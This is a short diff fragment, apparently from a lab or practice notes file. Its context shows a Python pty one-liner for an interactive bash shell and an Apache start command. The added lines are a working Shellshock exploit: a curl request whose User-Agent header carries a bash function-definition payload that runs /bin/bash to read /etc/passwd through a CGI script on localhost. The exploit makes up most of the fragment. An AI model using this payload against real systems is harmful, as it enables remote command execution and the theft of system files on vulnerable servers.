@@ -9,4 +9,8 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 # start apache server
 /etc/init.d/apache2 start
 
+# shellshock with cgi 
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
+http://localhost:8080/cgi-bin/vulnerable
+
 
